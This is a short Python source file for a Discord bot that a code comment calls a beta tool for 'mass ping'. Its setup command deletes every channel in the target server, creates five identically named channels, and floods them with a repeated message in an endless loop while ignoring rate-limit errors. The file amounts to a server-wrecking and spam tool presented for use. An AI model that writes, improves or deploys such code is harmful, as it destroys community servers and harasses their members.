# this is a beta for the moment and im trilingüe to do is create webhooks in the channels and start mass ping
import discord
from discord.ext import commands, tasks
import asyncio

intents = discord.Intents.default()
intents.all()

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} - {bot.user.id}')

async def send_messages_loop(channels, message, delay):
    while True:
        try:
            await asyncio.gather(*[channel.send(message) for channel in channels])
        except discord.errors.HTTPException as e:
            if e.status == 429:  
                print("Rate limited. Ignored.")
            else:
                raise

        await asyncio.sleep(delay)

@bot.command()
async def setup(ctx):
    channelname = input("Channel name: ")
    message = input("Message: ")
    delay = float(input("Delay: "))
    for channel in ctx.guild.channels:
        await channel.delete()

    new_channels = []
    for i in range(5):
        new_channel = await ctx.guild.create_text_channel(f'{channelname}')
        new_channels.append(new_channel)

    bot.loop.create_task(send_messages_loop(new_channels, message, delay))

bot.run('token here')
